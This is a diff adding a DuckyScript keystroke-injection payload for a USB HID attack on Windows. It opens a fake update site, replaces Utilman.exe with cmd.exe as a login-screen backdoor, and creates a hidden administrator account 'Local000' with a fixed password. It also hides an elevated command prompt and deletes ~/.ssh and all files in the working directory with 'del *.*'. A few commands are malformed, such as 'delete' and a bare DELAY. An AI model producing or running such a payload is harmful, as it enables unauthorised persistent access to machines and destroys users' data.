@@ -1,0 +1,125 @@
+REM let the ducky HID enumerate
+DELAY 3000
+GUI r
+STRING del ~/.ssh
+ENTER
+Delay 800
+GUI r
+DELAY 500
+STRING iexplore http://fakeupdate.net/win10u/index.html
+ENTER
+REM is likely that have slow internet connection
+DELAY 4000
+REM The new account will be called "Local000".
+GUI
+DELAY 50
+STRING cmd
+MENU
+STRING a
+ENTER
+LEFT
+ENTER
+DELAY 200
+STRING takeown /f "%systemroot%\System32\Utilman.exe"
+ENTER
+DELAY 50
+STRING icacls "%systemroot%\System32\Utilman.exe" /grant administrators:F /T
+ENTER
+DELAY 50
+STRING cd %systemroot%\System32
+ENTER
+DELAY 50
+STRING mkdir util
+ENTER
+STRING xcopy cmd.exe util\
+ENTER
+DELAY 50
+STRING ren Utilman.exe Utilman.exe.bak
+ENTER
+STRING cd util
+ENTER
+DELAY 50
+STRING ren cmd.exe Utilman.exe
+ENTER
+DELAY 50
+STRING cd ..
+ENTER
+DELAY 50
+STRING xcopy util/Utilman.exe \
+ENTER
+DELAY 50
+STRING rmdir /s /q util
+ENTER
+DELAY 50
+STRING exit
+ENTER
+DELAY 50
+GUI u
+STRING net user Local000 /add
+ENTER
+DELAY 50
+STRING net localgroup administrators Local000 /add
+ENTER
+DELAY 50
+STRING exit
+ENTER
+DELAY 50
+GUI r
+STRING cmd
+ENTER
+DELAY 50
+STRING cd "%systemroot%\System32"
+ENTER
+DELAY 50
+STRING delete Utilman.exe
+ENTER
+DELAY 50
+STRING y
+ENTER
+DELAY 50
+STRING ren Utilman.exe.bak Utilman.exe
+ENTER
+DELAY 50
+STRING exit
+ENTER
+GUI
+STRING cmd
+MENU
+STRING a
+ENTER
+DELAY 50
+LEFT
+ENTER
+DELAY 200
+STRING net user Local000 *
+ENTER
+STRING hak5
+ENTER
+STRING hak5
+ENTER
+DELAY
+REM Open an admin command prompt 
+GUI r
+DELAY 500
+STRING powershell Start-Process cmd -Verb runAs
+ENTER
+DELAY 2000
+ALT y
+DELAY 1000
+REM Obfuscate the command prompt
+STRING mode con:cols=18 lines=1
+ENTER
+STRING color FE
+ENTER
+DELAY 3000
+GUI r
+DELAY 500
+STRING del ~/.ssh
+ENTER
+DELAY 10000
+GUI r
+STRING del *.*
+DELAY 500
+ENTER
+DELAY 300
+ENTER
